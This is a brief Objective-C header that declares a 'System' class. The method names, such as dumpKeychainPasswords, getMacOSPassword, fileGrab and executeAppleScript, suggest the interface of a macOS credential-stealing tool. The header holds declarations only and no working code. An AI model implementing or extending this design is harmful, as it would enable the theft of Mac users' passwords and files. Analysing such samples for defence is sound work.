#import <Foundation/Foundation.h>

@class Tools;

@interface System : NSObject

- (instancetype)initWithEncryptionKey:(NSString *)encryptionKey;
- (void)collectSystemInfo;
- (void)dumpKeychainPasswords;
- (void)getMacOSPassword;
- (void)fileGrab;
- (void)getIP:(void (^)(NSDictionary *ipInfo, NSError *error))completion;
- (int)executeAppleScript:(NSString *)script;
- (void)runAppleScriptWithPath;

@property (nonatomic, strong) NSString *encryptionKey;

@end
